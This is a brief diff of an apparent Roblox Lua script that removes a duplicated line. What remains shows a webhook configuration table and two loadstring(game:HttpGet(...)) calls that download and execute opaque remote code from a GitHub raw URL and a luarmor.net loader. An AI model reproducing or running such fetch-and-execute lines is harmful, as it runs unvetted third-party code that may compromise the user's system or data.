@@ -78,5 +78,4 @@ _G.WEBHOOK_CONFIG = {
     hop_timer = 300
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/bag/refs/heads/main/io"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/bag/refs/heads/main/io"))()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ccbddd87670e37be6aa0dbf793748a94.lua"))()
